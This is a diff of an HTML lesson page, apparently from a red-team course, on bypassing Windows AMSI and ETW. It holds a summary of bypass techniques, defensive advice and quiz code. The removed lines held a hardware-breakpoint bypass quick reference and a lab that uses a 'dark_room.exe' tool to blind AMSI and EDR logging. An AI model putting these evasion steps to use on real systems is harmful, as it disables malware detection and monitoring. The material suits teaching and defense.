+                    <li>Classic in-memory patching and its detection artifacts</li>
+                    <li>Reflection-based bypasses and obfuscation techniques</li>
+                    <li>DLL unload via <code>NtUnmapViewOfSection</code></li>
+                    <li>PowerShell-specific bypass techniques</li>
+                    <li>Hardware breakpoint bypass — the zero-write, zero-detection technique</li>
+                    <li>Defensive strategies: memory integrity, API hooking, CLM, WDAC</li>
+                </ul>
+
+                <div class="first-principle" style="margin-top: 2rem;">
+                    <h3>🎯 Key Takeaway</h3>
+                    <p>AMSI is a <span class="neon-highlight">client-side</span> security control. It runs in the same process as the attacker. This fundamental architectural decision means AMSI can never be fully secure against a determined adversary with code execution. The best defense is <span class="neon-amber">defense in depth</span>: combine AMSI with CLM, WDAC, EDR behavioral monitoring, and network segmentation.</p>
+                </div>
+
+                <div class="nav" style="margin-top: 2rem;">
+                    <a href="MODULE_10_Code_Injection.html">← Module 10: Code Injection</a>
+                    <a href="MODULE_12_Defensive_Verify.html">Module 12: Defensive Verify →</a>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
 
-  <div class="widget-container">
-    <div class="widget-header">Iron Sun — AMSI/ETW Bypass Demo</div>
-    <iframe class="widget-iframe" src="../widgets/iron_sun_widget.html" title="Iron Sun AMSI Bypass Demo"></iframe>
-  </div>
+    <script>
+        function copyCode(btn) {
+            const block = btn.parentElement;
+            const text = block.innerText.replace('COPY', '').trim();
+            navigator.clipboard.writeText(text).then(() => {
+                btn.textContent = 'COPIED!';
+                setTimeout(() => btn.textContent = 'COPY', 1500);
+            });
+        }
 
-  <div class="section">
-    <div class="section-title">Quick Reference</div>
-    <div class="section-content">
-      <div class="quick-ref">
-        <div class="quick-ref-item"><div class="quick-ref-cmd">DR0 = AmsiScanBuffer</div><div class="quick-ref-desc">AMSI execute breakpoint</div></div>
-        <div class="quick-ref-item"><div class="quick-ref-cmd">DR1 = EtwEventWrite</div><div class="quick-ref-desc">ETW execute breakpoint</div></div>
-        <div class="quick-ref-item"><div class="quick-ref-cmd">DR7 = 0x405</div><div class="quick-ref-desc">Enable DR0+DR1</div></div>
-        <div class="quick-ref-item"><div class="quick-ref-cmd">AddVectoredExceptionHandler</div><div class="quick-ref-desc">Register VEH to catch breaks</div></div>
-        <div class="quick-ref-item"><div class="quick-ref-cmd">EXCEPTION_SINGLE_STEP</div><div class="quick-ref-desc">Exception code for HWBP</div></div>
-        <div class="quick-ref-item"><div class="quick-ref-cmd">ctx->Rax = 1</div><div class="quick-ref-desc">Fake AMSI_RESULT_CLEAN</div></div>
-      </div>
-    </div>
-  </div>
+        function checkAnswer(option, quizNum) {
+            const container = document.getElementById('quiz' + quizNum);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById('feedback' + quizNum);
+            
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt.dataset.correct === 'true') {
+                    opt.classList.add('correct');
+                } else if (opt === option && opt.dataset.correct !== 'true') {
+                    opt.classList.add('wrong');
+                }
+            });
+            
+            feedback.classList.add('show');
+            if (option.dataset.correct === 'true') {
+                feedback.classList.add('correct');
+                feedback.innerHTML = '<strong>✅ Correct!</strong> ' + getExplanation(quizNum, true);
+            } else {
+                feedback.classList.add('wrong');
+                feedback.innerHTML = '<strong>❌ Incorrect.</strong> ' + getExplanation(quizNum, false);
+            }
+        }
 
-  <div class="section">
-    <div class="section-title">Lab: Verify AMSI Is Dead</div>
-    <div class="section-content">
-      <div class="code-block">
-        # Before Dark Room — AMSI will block this:<br>
-        PS&gt; [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI="))<br>
-        # Result: BLOCKED<br><br>
-        # After Dark Room active — same string passes:<br>
-        PS&gt; .\dark_room.exe --activate<br>
-        PS&gt; [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI="))<br>
-        # Result: AmsiScanBuffer (printed, not blocked)<br><br>
-        # Verify ETW blind — check EDR console for .92 activity<br>
-        # If ETW is blind: no events appear in Defender's event log while payload runs
-      </div>
-    </div>
-  </div>
-
-  <div class="nav">
-    <a href="MODULE_05_SHELLCODE.html">← Module 05: Shellcode</a>
-    <a href="MODULE_16_C2.html">Module 16: C2 →</a>
-  </div>
-</div>
+        function getExplanation(quizNum, isCorrect) {
+            const explanations = {
+                1: {
+                    true: 'The correct flow is: Application calls AmsiScanBuffer → AmsiScanBuffer forwards to the registered Provider → Provider returns a Decision (CLEAN, BLOCKED, or DETECTED).',
+                    false: 'The correct flow is: Application → AmsiScanBuffer → Provider → Decision. Remember that AmsiScanBuffer is the API gateway, not the final decision maker.'
+                },
+                2: {
+                    true: 'Hardware breakpoints use CPU debug registers (DR0-DR7) and require zero memory writes. The Vectored Exception Handler catches the breakpoint before AmsiScanBuffer executes, fakes the return value, and skips past the function.',
+                    false: 'Only hardware breakpoints leave zero memory artifacts. Patching modifies executable memory, reflection modifies managed heap fields, and DLL unloading unmaps memory — all leave detectable traces.'
+                },
+                3: {
+                    true: 'Constrained Language Mode (CLM) restricts access to .NET types and methods that enable reflection-based bypasses. Even if AMSI is bypassed, the attacker cannot use [Ref].Assembly.GetTypes() or similar APIs in CLM.',
+                    false: 'While Real-Time Protection and logging are useful, they do not prevent the bypass from executing. CLM is the only option that structurally prevents reflection-based attacks by removing the APIs needed to perform them.'
+                }
+            };
+            return explanations[quizNum][isCorrect ? 'true' : 'false'];
+        }
+    </script>
 </body>
 </html>
